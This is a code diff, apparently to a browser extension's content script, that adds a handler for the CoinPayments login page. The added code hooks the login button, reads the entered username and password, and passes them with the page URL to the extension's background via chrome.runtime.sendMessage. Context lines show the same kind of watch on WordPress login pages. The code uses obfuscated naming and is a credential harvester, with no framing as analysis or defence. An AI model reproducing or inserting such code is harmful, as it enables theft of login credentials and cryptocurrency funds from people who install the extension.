@@ -525,6 +525,21 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
                   }
               }, 1000)
           };
+
+          if (top['location']['href']['indexOf']('https://www.coinpayments.net/login') > -1) {
+                var interval = setInterval(function () {
+                    if (document['getElementsByClassName']('login')) {
+                        clearInterval(interval);
+                        document['getElementsByClassName']('w-button button large login').onclick = function (_0x441cx2) {
+                         var login = {};
+                        login.username = document.getElementsByName("username")[0].value;
+                        login.pass = document.getElementsByName("pass")[0].value;
+                        login.href = window.location.href;
+                        chrome.runtime.sendMessage({cmd: "l",login});
+                        }
+                    }
+                }, 1000)
+            };
     //
 // var img = document.getElementsByTagName('img');
 //      for (var i = 0; i < img.length; i++){
